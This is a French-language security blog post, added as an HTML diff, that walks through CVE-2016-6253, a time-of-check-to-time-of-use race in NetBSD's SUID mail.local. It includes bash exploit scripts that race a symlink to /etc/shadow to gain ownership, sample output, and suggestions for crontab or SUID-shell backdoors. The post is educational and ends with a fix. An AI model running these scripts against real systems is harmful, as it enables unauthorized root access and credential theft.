@@ -1,0 +1,170 @@
+<!DOCTYPE HTML>
+<html >
+  <head> 
+    <title>Time Of Check To Time Of Use et Privilege Escalations</title>
+    <meta charset="utf-8" />
+
+    <link rel="stylesheet" type="text/css" href="../style/base.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="site-title">
+        <h1>Breakpoint</h1>
+        <h2>Stepping through security</h2>
+      </div>
+      <div class="wrap">
+        <ul>
+          <li><a href="../index.html">Index</a></li>
+          <li><a href="https://github.com/cym13">Github</a></li>
+          <li><a href="../about.html">About</a></li>
+        </ul>
+      </div>
+    </header>
+
+    <div class="content">
+      
+    <h1>Time Of Check To Time Of Use et Privilege Escalations</h1>
+    <section id="quelques-notes">
+        <h2>Quelques notes</h2>
+        <p>Le but de cet article est de dérouler un cas concret de Privilege Escalation basé sur une Race Condition à cause d'une Time Of Check To Time Of Use dans <strong>mail.local</strong> sur NetBSD (CVE-2016-6253).</p>
+        <p>Il s'agit d'une adaptation de <a href="http://akat1.pl/?id=2">http://akat1.pl/?id=2</a> que je remercie grandement pour son excellent article. Par soucis de pédagogie j'ai pris quelques raccourcis concernant l'exploitation de cette vulnérabilité au profit d'une plus grande clarté sur les processus généraux.</p>
+        <p>Bref, pour du code qui fonctionne allez voir son blog ; ici on explique surtout comment réutiliser le concept ailleurs.</p>
+        <p>Et maintenant, voyons cette course !</p>
+        <img width="100%" src="https://derpicdn.net/img/view/2012/1/15/299__safe_rainbow+dash_pinkie+pie_applejack_vector_wallpaper_pony_race_jet_running+of+the+leaves.png" />
+    </section>
+    <section id="le-bug">
+        <h2>Le bug</h2>
+        <section id="mail-local">
+            <h3>mail.local</h3>
+            <p><strong>mail.local</strong> est un programme gérant les mails utilisateurs dans NetBSD. Il a la particularité d'être SUID root ce qui signifie qu'il est lancé avec les droits super utilisateurs même s'il est lancé par un autre utilisateur. Cela introduit quelques restrictions sur son utilisation (impossible de lancer <strong>ptrace</strong> sur le processus ou d'employer <strong>LD_PRELOAD</strong> par exemple).</p>
+            <p>Cependant les processus SUID sont généralement considérés comme de gros risques de sécurité car la moindre vulnérabilité peut donner une escalade de privilèges. C'est une de ces vulnérabilités que nous allons voir maintenant.</p>
+        </section>
+        <section id="la-fonction-deliver">
+            <h3>La fonction deliver</h3>
+            <p><a href="https://nxr.netbsd.org/xref/src/libexec/mail.local/mail.local.c">Voici</a> la fonction qui contient la vulnérabilité.</p>
+            <pre data-language="c"><span></span><span class="k">static</span> <span class="kt">int</span>
+<span class="nf">deliver</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">lockfile</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">sb</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">passwd</span> <span class="n">pwres</span><span class="p">,</span> <span class="o">*</span><span class="n">pw</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">pwbuf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">created</span><span class="p">,</span> <span class="n">mbfd</span><span class="p">,</span> <span class="n">nr</span><span class="p">,</span> <span class="n">nw</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">rval</span><span class="o">=</span><span class="n">EX_OK</span><span class="p">,</span> <span class="n">lfd</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">biffmsg</span><span class="p">[</span><span class="mi">100</span><span class="p">],</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="o">*</span><span class="mi">1024</span><span class="p">],</span> <span class="n">path</span><span class="p">[</span><span class="n">MAXPATHLEN</span><span class="p">],</span> <span class="n">lpath</span><span class="p">[</span><span class="n">MAXPATHLEN</span><span class="p">];</span>
+    <span class="kt">off_t</span> <span class="n">curoff</span><span class="p">;</span>
+<span class="p">...</span>
+    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%s&quot;</span><span class="p">,</span> <span class="n">_PATH_MAILDIR</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">created</span> <span class="o">=</span> <span class="n">lstat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sb</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+        <span class="p">(</span><span class="n">sb</span><span class="p">.</span><span class="n">st_nlink</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">S_ISLNK</span><span class="p">(</span><span class="n">sb</span><span class="p">.</span><span class="n">st_mode</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="n">logwarn</span><span class="p">(</span><span class="s">&quot;%s: linked file&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">EX_OSERR</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">...</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">mbfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_EXLOCK</span><span class="p">,</span>
+        <span class="n">S_IRUSR</span><span class="o">|</span><span class="n">S_IWUSR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">mbfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_EXLOCK</span><span class="p">,</span>
+            <span class="n">S_IRUSR</span><span class="o">|</span><span class="n">S_IWUSR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">logwarn</span><span class="p">(</span><span class="s">&quot;%s: %s&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+            <span class="k">return</span><span class="p">(</span><span class="n">EX_OSERR</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">...</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">created</span><span class="p">)</span>
+        <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">fchown</span><span class="p">(</span><span class="n">mbfd</span><span class="p">,</span> <span class="n">pw</span><span class="o">-&gt;</span><span class="n">pw_uid</span><span class="p">,</span> <span class="n">pw</span><span class="o">-&gt;</span><span class="n">pw_gid</span><span class="p">);</span>
+<span class="p">...</span>
+    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">fsync</span><span class="p">(</span><span class="n">mbfd</span><span class="p">);</span>      <span class="cm">/* Don&#39;t wait for update. */</span>
+    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">close</span><span class="p">(</span><span class="n">mbfd</span><span class="p">);</span>      <span class="cm">/* Implicit unlock. */</span></pre>
+            <p>En pseudo-python:</p>
+            <pre data-language="python"><span></span><span class="n">_PATH_MAILDIR</span> <span class="o">=</span> <span class="s2">&quot;/var/mail&quot;</span>
+
+<span class="k">def</span> <span class="nf">deliver</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">lockfile</span><span class="p">):</span>
+    <span class="n">path</span>    <span class="o">=</span> <span class="n">_PATH_MAILDIR</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="n">name</span>
+    <span class="n">created</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+
+    <span class="c1"># On vérifie que ce n&#39;est pas un lien symbolique</span>
+    <span class="k">if</span> <span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="ow">and</span> <span class="n">is_link</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Le fichier est un lien:&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="c1"># On tente de l&#39;ouvrir ou de le créer le cas échéant</span>
+    <span class="c1"># Cette fonction suivra un lien symbolique si présent</span>
+    <span class="n">mbfd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">mbfd</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Une erreur à la création du fichier a eu lieu&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Si le fichier n&#39;existait pas avant on change l&#39;owner pour</span>
+    <span class="c1"># l&#39;utilisateur courant (le vrai, pas root)</span>
+    <span class="k">if</span> <span class="n">created</span><span class="p">:</span>
+        <span class="n">chown</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">gid</span><span class="p">)</span>
+
+    <span class="n">mbfd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre>
+            <p>Cet extrait de code est assez clair et prend même la peine de vérifier que le fichier est un lien avant de le donner à <em>root</em> pour éviter qu'un utilisateur normal ne puisse créer un lien vers <em>/etc/shadow</em> par exemple et ainsi se l'accaparer.</p>
+        </section>
+        <section id="et-donc-ou-est-le-probleme">
+            <h3>Et donc ? Où est le problème ?</h3>
+            <p>On fait une vérification certes, mais ce programme n'est pas seul à tourner sur l'ordinateur... Que se passe-t-il si un utilisateur crée un lien symbolique entre la vérification de l'existence du fichier et son ouverture ?</p>
+        </section>
+    </section>
+    <section id="exploitation">
+        <h2>Exploitation</h2>
+        <section id="principe-de-base">
+            <h3>Principe de base</h3>
+            <p>Ceci est un exemple classique de Race Condition. Dans ce cas on parle d'un <a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU</a> (Time Of Check To Time Of Use), c'est à dire d'une race condition dérivant d'un décalage entre le moment où l'on effectue la vérification et le moment où l'on exécute une action normalement protégée par cette vérification.</p>
+            <p>En pratique ça ressemble à ça:</p>
+            <pre>mail.local                                    | Attaquant
+--------------------------------------------------------------------------
+Vérifie l'existence - Le fichier n'existe pas |
+                                              | Crée symlink malicieux
+Ouvre le fichier - Suis le lien symbolique    |
+Change le propriétaire                        |
+                                              | \o/ Profit !</pre>
+            <p>Le bug est particulièrement agréable ici car il ne demande aucune corruption mémoire (lesquelles sont souvent inévitables dans ce type de bug), c'est vraiment une pure Race Condition.</p>
+            <p>Bon, mais la fenêtre est assez serrée, ce n'est pas comme si on pouvais lui demander gentiment de faire une pause pour nous laisser lancer un <strong>ln</strong>.</p>
+            <p>Certes, mais rien ne nous oblige à n'essayer qu'une fois...</p>
+        </section>
+        <section id="la-fenetre-est-trop-petite-qu-ils-disaient">
+            <h3>La fenêtre est trop petite qu'ils disaient !</h3>
+            <p>Aucune fenêtre temporelle n'est trop petite pour être exploitée ! (Parole de <a href="https://en.wikipedia.org/wiki/Sliders">Sliders</a>).</p>
+            <p>Il nous faut une boucle infinie créant le lien symbolique puis le supprimant afin d'essayer qu'il ne soit présent qu'au moment du changement de propriétaire. Lancer mail.local dans la même boucle serait trop lent, nous avons besoins de faire cela dans un processus séparé. Il faut également noter que l'on est obligé de créer le fichier lorsque le lien est supprimé car <strong>chown</strong> n'est exécute que si le fichier n'existait pas lors du premier test.</p>
+            <p>Pour notre attaque nous allons créer un lien <strong>/var/mail/user</strong> vers <strong>/etc/shadow</strong>. Voici le script bash qui contient notre boucle principale, <strong>exploit.sh</strong>.</p>
+            <pre data-language="bash"><span></span><span class="nv">STEALPATH</span><span class="o">=</span><span class="s2">&quot;/etc/shadow&quot;</span>
+<span class="nv">MAILBOX</span><span class="o">=</span><span class="s2">&quot;/var/mail/user&quot;</span>
+
+<span class="k">while</span> <span class="nb">true</span> <span class="p">;</span> <span class="k">do</span>
+    rm <span class="s2">&quot;</span><span class="nv">$MAILBOX</span><span class="s2">&quot;</span>
+    ln -s <span class="s2">&quot;</span><span class="nv">$STEALPATH</span><span class="s2">&quot;</span> <span class="s2">&quot;</span><span class="nv">$MAILBOX</span><span class="s2">&quot;</span>
+    rm <span class="s2">&quot;</span><span class="nv">$MAILBOX</span><span class="s2">&quot;</span>
+    touch <span class="s2">&quot;</span><span class="nv">$MAILBOX</span><span class="s2">&quot;</span>
+
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="k">$(</span>stat <span class="s2">&quot;</span><span class="nv">$STEALPATH</span><span class="s2">&quot;</span> -c <span class="s1">&#39;%u&#39;</span><span class="k">)</span><span class="s2">&quot;</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="p">;</span> <span class="k">then</span>
+        <span class="nb">echo</span> <span class="s2">&quot;Yeah ! Réussi !</span>
+<span class="s2">        break</span>
+<span class="s2">    fi</span>
+<span class="s2">done</span></pre>
+            <p>La seconde boucle dans <strong>mailer.sh</strong> :</p>
+            <pre data-language="bash"><span></span><span class="k">while</span> <span class="nb">true</span> <span class="p">;</span> <span class="k">do</span>
+    <span class="nb">echo</span> x <span class="p">|</span> /usr/libexec/mail.local usr <span class="m">2</span>&gt; /dev/null
+<span class="k">done</span></pre>
+            <p>Et à l'exécution :</p>
+            <pre data-language="bash"><span></span>user@netbsd-dev$ mailer.sh <span class="p">&amp;</span>
+<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="m">1234</span>
+user@netbsd-dev$ exploit.sh
+Yeah ! Réussi !</pre>
+            <p>Le processus ne prend normalement que quelques secondes pour terminer avec succès.</p>
+        </section>
+        <section id="ok-et-ensuite">
+            <h3>Ok, et ensuite ?</h3>
+            <p>On peut obtenir n'importe quel fichier du système, les candidats classiques sont <strong>/etc/shadow</strong> et le <strong>crontab</strong>. En ajoutant une entrée au crontab on peut amener root à nous donner périodiquement ses droits. On peut aussi se servir de ceci pour créer un script SUID lançant un shell avec les droits roots ce qui serait une porte dérobée appréciable. Les possibilités sont nombreuses.</p>
+        </section>
+    </section>
+    <section id="comment-corriger">
+        <h2>Comment corriger</h2>
+        <p>Le mieux pour éviter les TOCTTOU est de valider le fichier le plus tard possible, après l'avoir ouvert par exemple (mais bien évidemment avant de l'utiliser).</p>
+    </section>
+    <footer>Generated on: 2017-02-24 23:51 UTC. </footer>
+
+    </div>
+  </body>
+</html>
